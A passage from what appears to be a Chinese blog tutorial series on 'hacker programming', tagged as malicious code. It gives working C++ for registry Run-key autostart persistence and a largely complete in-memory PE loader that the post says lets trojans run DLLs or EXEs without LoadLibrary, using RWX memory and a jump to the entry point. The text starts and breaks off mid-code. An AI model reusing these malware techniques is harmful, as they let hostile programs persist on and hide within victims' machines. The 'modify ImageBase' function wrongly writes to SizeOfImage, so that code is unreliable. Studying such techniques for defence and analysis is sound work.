class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs x86asm">LSTATUS RegSetValueExA(<br>  HKEY       hKey,<br>  LPCSTR     lpValueName,<br>  <span class="hljs-built_in">DWORD</span>      Reserved,<br>  <span class="hljs-built_in">DWORD</span>      dwType,<br>  const <span class="hljs-built_in">BYTE</span> *lpData,<br>  <span class="hljs-built_in">DWORD</span>      cbData<br>)<span class="hljs-comment">;</span><br></code></pre></div></td></tr></table></figure><p>hKey：指定一个已打开项的句柄，或一个标准项名。</p><p>lpValueName：指向一个字符串的指针，该字符串包含了与设置值的名称。若拥有该名称的值并不存在于指定的注册表中，则此函数会将其加入到该项。如果此值是NULL或指向空字符串，则此函数将会设置该项的默认值或未命名值得类型和数据。</p><p>Reserved：保留值，必须为0；</p><p>dwType：指定将存储的数据类型，该参数可以为以下值之一。</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>REG_BINARY</td><td>任何形式的二进制数据</td></tr><tr><td>REG_DWORD</td><td>一个32位的数字</td></tr><tr><td>REG_DWORD_LITTLE_ENDIAN</td><td>一个格式为“低字节在前”的32位数字</td></tr><tr><td>REG_DWORD_BIG_ENDIAN</td><td>一个格式为“高字节在前”的32位数字</td></tr><tr><td>REG_EXPAND_SZ</td><td>一个以0结尾的字符串，该字符串包含环境变量（如“%PATH”）</td></tr><tr><td>REG_LINK</td><td>一个Unicode格式的带符号链接</td></tr><tr><td>REG_MULTI_SZ</td><td>一个以0结尾的字符串数组，该数组以链接两个0作为终止符</td></tr><tr><td>REG_ONE</td><td>未定义值类型</td></tr><tr><td>REG_RESOURCE_LIST</td><td>一个设备驱动器资源列表</td></tr><tr><td>REG_SZ</td><td>一个以0结尾的字符串</td></tr></tbody></table><p>lpData：指向一个缓冲区，该缓冲区包含了为指定值名称存储的数据。</p><p>cbData：指定由lpData参数所指向的数据大小，单位是字节。</p><p>返回值：返回0表示陈成功；返回其他任何值都代表一个错误代码。</p><h4 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h4><p>对于Windows来说，提供了专门的开机自启动注册表，每次开机时，它都会在这个注册表键下遍历键值，以获取键值中的程序路径，并创建进程启动程序。所以要想实现注册表开机自启动，只需要在这个注册表键下添加想要设置自启动的程序路径就可以了。</p><p>这里用最常见的RUN键来进行设置，该键位置是[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]和[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</p><p>代码实现在HKEY_LOCAL_MACHINE下进行设置，这需要管理员运行权限。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-function">BOOL <span class="hljs-title">Register</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* lpszFileName, <span class="hljs-keyword">char</span>* lpszValueName)</span> </span>&#123;<br>    HKEY hKey;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">RegOpenKeyEx</span>(HKEY_LOCAL_MACHINE, <span class="hljs-string">&quot;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>, <span class="hljs-number">0</span>, KEY_WRITE, &amp;hKey) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;打开注册表失败\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">RegSetValueEx</span>(hKey, lpszValueName, <span class="hljs-number">0</span>, REG_SZ, (BYTE*)lpszFileName, (<span class="hljs-built_in">lstrlen</span>(lpszFileName) + <span class="hljs-number">1</span>)) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;设置注册表值失败\n&quot;</span>);<br>        <span class="hljs-built_in">RegCloseKey</span>(hKey);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-built_in">RegCloseKey</span>(hKey);<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">Register</span>(<span class="hljs-string">&quot;C:\\Users\\b1ackie\\Desktop\\Register.exe&quot;</span>, <span class="hljs-string">&quot;b1ackie&quot;</span>) == FALSE) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;自启动失败\n&quot;</span>);<br>        <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;自启动成功\n&quot;</span>);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>打开程序，提示自启动成功，说明注册表设置成功。</p><p><img src="/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E6%B3%A8%E5%86%8C%E8%A1%A8/1.png"></p><p>用regedit命令查看注册表相关信息，可以成功看到当前的注册表信息，注意图中路径的不同，这是因为重定位的原因。</p><p><img src="/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E6%B3%A8%E5%86%8C%E8%A1%A8/2.png"></p><p>也可以使用火绒剑，如图可以看到启动项的信息，现在重启计算机，就会自动启动了。</p><p><img src="/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E6%B3%A8%E5%86%8C%E8%A1%A8/3.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>参考《Windows黑客编程技术详解》一书</p>]]></content>
    
    
    <categories>
      
      <category>黑客编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>黑客编程</tag>
      
      <tag>自启动技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>启动技术-内存直接加载运行</title>
    <link href="/2021/07/15/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%86%85%E5%AD%98%E7%9B%B4%E6%8E%A5%E5%8A%A0%E8%BD%BD%E8%BF%90%E8%A1%8C/"/>
    <url>/2021/07/15/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%86%85%E5%AD%98%E7%9B%B4%E6%8E%A5%E5%8A%A0%E8%BD%BD%E8%BF%90%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h4 id="内存直接加载运行"><a href="#内存直接加载运行" class="headerlink" title="内存直接加载运行"></a>内存直接加载运行</h4><p>内存直接加载运行就是，模拟PE加载器的功能，把DLL或者exe等PE文件从内存中直接加载到病毒木马的内存中去运行，不需要通过loadlibrary等现成的API函数去操作。</p><h4 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h4><p>构造一个PE装载器，将PE文件加载到内存中。大致过程，首先要申请一块内存，然后将PE文件按照映像对齐大小映射到内存中；根据重定位表，重定位硬编码数据；获取导入表中的函数及其地址；如果是DLL，获取导出表的相关数据（EXE一般没有导出表）；获取入口点的地址，若为EXE，直接跳到入口点即可执行，DLL文件的话还需要构造一个DLLMAIN函数，实现DLL加载。</p><h4 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4><p>打开文件并且获取大小</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">char</span>* FileName = <span class="hljs-string">&quot;自己的文件路径&quot;</span>;<br><span class="hljs-comment">//打开文件</span><br>HANDLE hFile = <span class="hljs-built_in">CreateFileA</span>(FileName, GENERIC_READ | GENERIC_WRITE,<br>FILE_SHARE_READ | FILE_SHARE_WRITE, <span class="hljs-literal">NULL</span>, OPEN_EXISTING,<br>FILE_ATTRIBUTE_ARCHIVE, <span class="hljs-literal">NULL</span>);<br><span class="hljs-comment">//获取大小</span><br>DWORD dwFileSize = <span class="hljs-built_in">GetFileSize</span>(hFile, <span class="hljs-literal">NULL</span>);<br><span class="hljs-comment">//申请内存空间</span><br>PBYTE pData = <span class="hljs-keyword">new</span> BYTE[dwFileSize];<br>DWORD dwRet = <span class="hljs-number">0</span>;<br><span class="hljs-comment">//将文件读取到内存中</span><br><span class="hljs-built_in">ReadFile</span>(hFile, pData, dwFileSize, &amp;dwRet, <span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in">CloseHandle</span>(hFile);<br></code></pre></div></td></tr></table></figure><h5 id="获取sizeofimage"><a href="#获取sizeofimage" class="headerlink" title="获取sizeofimage"></a>获取sizeofimage</h5><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/*获取PE文件的镜像大小，获取加载到内存后的大小</span><br><span class="hljs-comment">* lpData内存中的基址</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function">DWORD <span class="hljs-title">GetImageSize</span><span class="hljs-params">(LPVOID lpData)</span> </span>&#123;<br>DWORD dwSizeOfImage = <span class="hljs-number">0</span>;<br>PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpData;<br>PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);<br>dwSizeOfImage = pNtHeaders-&gt;OptionalHeader.SizeOfImage;<br><span class="hljs-keyword">return</span> dwSizeOfImage;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>根据获取的sizeofimage，在进程中开辟一个内存块，权限可读可写可执行。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">LPVOID lpBaseAddr = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, dwImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br><span class="hljs-built_in">RtlZeroMemory</span>(lpBaseAddr, dwImageSize);<br></code></pre></div></td></tr></table></figure><h5 id="重定位数据"><a href="#重定位数据" class="headerlink" title="重定位数据"></a>重定位数据</h5><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*获取重定位表的相关数据并且重定位数据</span><br><span class="hljs-comment">* lpBaseAddr: 内存PE数据按SectionAlignment大小对齐映射到进程内存中的内存基址</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function">BOOL <span class="hljs-title">DoRelocationTable</span><span class="hljs-params">(LPVOID lpBaseAddr)</span> </span>&#123;<br>PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr;<br>PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);<br><span class="hljs-comment">//获取重定位表</span><br>PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)pDosHeader +<br>pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);<br><span class="hljs-keyword">if</span> ((PVOID)pReloc == (PVOID)pDosHeader) &#123;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-comment">//开始扫描重定位表</span><br><span class="hljs-keyword">while</span> ((pReloc-&gt;VirtualAddress + pReloc-&gt;SizeOfBlock) != <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">//重定位表的头部加上sizeof(IMAGE_BASE_RELOCATION)就是重定位数据的开始</span><br>WORD* pRelocData = (WORD*)((PBYTE)pReloc + <span class="hljs-keyword">sizeof</span>(IMAGE_BASE_RELOCATION));<br><span class="hljs-comment">//获取需要重定位的数据的个数</span><br><span class="hljs-keyword">int</span> nNumberOfReloc = (pReloc-&gt;SizeOfBlock - <span class="hljs-keyword">sizeof</span>(IMAGE_BASE_RELOCATION)) / <span class="hljs-keyword">sizeof</span>(WORD);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; nNumberOfReloc; i++) &#123;<br>            <span class="hljs-comment">//高位是否为3，判断是否需要修复</span><br><span class="hljs-keyword">if</span> ((DWORD)(pRelocData[i] &amp; <span class="hljs-number">0x0000F000</span>) == <span class="hljs-number">0x00003000</span>) &#123; <br><span class="hljs-comment">//获取需要重定位数据的地址</span><br>DWORD* pAddress = (DWORD*)((PBYTE)pDosHeader + pReloc-&gt;VirtualAddress + (pRelocData[i] &amp; <span class="hljs-number">0x0FFF</span>));<br><span class="hljs-comment">//修改重定位数据，公式：地址-旧基址+新基址，地址是pAddress中的值</span><br>DWORD dwDelta = (DWORD)pDosHeader - pNtHeaders-&gt;OptionalHeader.ImageBase;<br>*pAddress += dwDelta;<br>&#125;<br>&#125;<br><span class="hljs-comment">//继续处理下一组重定位数据</span><br>pReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pReloc + pReloc-&gt;SizeOfBlock);<br>&#125;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h5><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/*获取导入表的相关数据</span><br><span class="hljs-comment">* lpBaseAddr: 内存PE数据按SectionAlignment大小对齐映射到进程内存中的内存基址</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function">BOOL <span class="hljs-title">DoImportTable</span><span class="hljs-params">(LPVOID lpBaseAddr)</span> </span>&#123;<br>PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr;<br>PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);<br><span class="hljs-comment">//获取导入表地址</span><br>PIMAGE_IMPORT_DESCRIPTOR pImportTable = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)pDosHeader +<br>pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);<br><span class="hljs-comment">// 循环遍历导入表中的DLL及获取导入表中的函数地址</span><br><span class="hljs-keyword">char</span>* lpDllName = <span class="hljs-literal">NULL</span>;<br>HMODULE hDll = <span class="hljs-literal">NULL</span>;<br>PIMAGE_THUNK_DATA lpImportNameArray = <span class="hljs-literal">NULL</span>;<br>PIMAGE_IMPORT_BY_NAME lpImportByName = <span class="hljs-literal">NULL</span>;<br>PIMAGE_THUNK_DATA lpImportFuncAddrArray = <span class="hljs-literal">NULL</span>;<br>FARPROC lpFuncAddress = <span class="hljs-literal">NULL</span>;<br>DWORD i = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (TRUE) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> == pImportTable-&gt;OriginalFirstThunk) &#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-comment">// 获取导入表中DLL的名称并加载DLL</span><br>lpDllName = (<span class="hljs-keyword">char</span>*)((DWORD)pDosHeader + pImportTable-&gt;Name);<br>hDll = <span class="hljs-built_in">GetModuleHandleA</span>(lpDllName);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == hDll) &#123;<br>hDll = <span class="hljs-built_in">LoadLibraryA</span>(lpDllName);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == hDll) &#123;<br>pImportTable++;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br>&#125;<br>i = <span class="hljs-number">0</span>;<br><span class="hljs-comment">// 获取OriginalFirstThunk以及对应的导入函数名称表首地址</span><br>lpImportNameArray = (PIMAGE_THUNK_DATA)((DWORD)pDosHeader + pImportTable-&gt;OriginalFirstThunk);<br><span class="hljs-comment">// 获取FirstThunk以及对应的导入函数地址表首地址</span><br>lpImportFuncAddrArray = (PIMAGE_THUNK_DATA)((DWORD)pDosHeader + pImportTable-&gt;FirstThunk);<br><span class="hljs-keyword">while</span> (TRUE) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> == lpImportNameArray[i].u1.AddressOfData) &#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-comment">// 获取IMAGE_IMPORT_BY_NAME结构</span><br>lpImportByName = (PIMAGE_IMPORT_BY_NAME)((DWORD)pDosHeader + lpImportNameArray[i].u1.AddressOfData);<br><span class="hljs-comment">// 判断导出函数是序号导出还是函数名称导出</span><br><span class="hljs-keyword">if</span> (<span class="hljs-number">0x80000000</span> &amp; lpImportNameArray[i].u1.Ordinal) &#123;<br><span class="hljs-comment">// 序号导出</span><br><span class="hljs-comment">// 当IMAGE_THUNK_DATA值的最高位为1时，表示函数以序号方式输入，这时，低位被看做是一个函数序号</span><br>lpFuncAddress = <span class="hljs-built_in">GetProcAddress</span>(hDll, (LPCSTR)(lpImportNameArray[i].u1.Ordinal &amp; <span class="hljs-number">0x0000FFFF</span>));<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// 名称导出</span><br>lpFuncAddress = <span class="hljs-built_in">GetProcAddress</span>(hDll, (LPCSTR)lpImportByName-&gt;Name);<br>&#125;<br>lpImportFuncAddrArray[i].u1.Function = (DWORD)lpFuncAddress;<br>i++;<br>&#125;<br>pImportTable++;<br>&#125;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="修改ImageBase"><a href="#修改ImageBase" class="headerlink" title="修改ImageBase"></a>修改ImageBase</h5><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//修改ImageBase</span><br><span class="hljs-function">BOOL <span class="hljs-title">SetImage</span><span class="hljs-params">(LPVOID lpBaseAddr)</span> </span>&#123;<br>PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr;<br>PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);<br>pNtHeaders-&gt;OptionalHeader.SizeOfImage = (ULONG32)lpBaseAddr;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="获取入口点"><a href="#获取入口点" class="headerlink" title="获取入口点"></a>获取入口点</h5><p>如果是EXE，这一步，获取addressOfEntryPoint之后跳到入口点即可直接执行。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">Entry</span><span class="hljs-params">(LPVOID lpBaseAddr)</span> </span>&#123;<br>PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr;<br>PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);<br>LPVOID Entry = (LPVOID)((ULONG32)pDosHeader + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint);<br>__asm &#123;<br>mov eax,Entry<br>jmp eax<br>&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>现在来测试一下直接运行一个EXE，测试文件为桌面上的TestProcess.exe。源代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b1ackie!!!\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>运行程序查看效果，可以看到直接加载运行TestProcess.exe。</p><p><img src="/2021/07/15/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%86%85%E5%AD%98%E7%9B%B4%E6%8E%A5%E5%8A%A0%E8%BD%BD%E8%BF%90%E8%A1%8C/1.png"></p><p>若是DLL文件，还需要构造一下DLLMAIN</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CallDllMain</span><span class="hljs-params">(LPVOID lpBaseAddr)</span> </span>&#123;<br>typedef_DllMain DllMain = <span class="hljs-literal">NULL</span>;<br>PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr;<br>PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);<br>DllMain = (typedef_DllMain)((ULONG32)pDosHeader + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint);<br>BOOL bRet = <span class="hljs-built_in">DllMain</span>((HINSTANCE)lpBaseAddr,DLL_PROCESS_ATTACH,<span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (bRet == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;构造入口点失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> bRet;<br>&#125;<br><span class="hljs-keyword">return</span> bRet;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h5><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*获取导出函数及其地址</span><br><span class="hljs-comment">* lpBaseAddr: 内存PE数据按SectionAlignment大小对齐映射到进程内存中的内存基址</span><br><span class="hljs-comment">* lpszFuncName：导出函数名字</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function">LPVOID <span class="hljs-title">GetExFuncAddr</span><span class="hljs-params">(LPVOID lpBaseAddr,<span class="hljs-keyword">char</span>* lpszFuncName)</span> </span>&#123;<br>LPVOID lpFunc = <span class="hljs-literal">NULL</span>;<br>PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr;<br>PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);<br><span class="hljs-comment">//获取导出表地址</span><br>PIMAGE_EXPORT_DIRECTORY pExportTable = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pDosHeader + <br>pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);<br><span class="hljs-comment">//从导出表取出的函数名</span><br><span class="hljs-keyword">char</span>* lpFuncName = <span class="hljs-literal">NULL</span>;<br><span class="hljs-comment">//获取AddressOfNames</span><br>PDWORD lpAddressOfNamesArray = (PDWORD)((DWORD)pDosHeader + pExportTable-&gt;AddressOfNames);<br><span class="hljs-comment">//获取AddressOfNameOrdinals</span><br>PWORD lpAddressOfNameOrdinalArray = (PWORD)((DWORD)pDosHeader + pExportTable-&gt;AddressOfNameOrdinals);<br><span class="hljs-comment">//索引值</span><br>WORD wHint = <span class="hljs-number">0</span>;<br><span class="hljs-comment">//获取AddressOfFunctions</span><br>PDWORD lpAddressOfFuncArray = (PDWORD)((DWORD)pDosHeader + pExportTable-&gt;AddressOfFunctions);<br><span 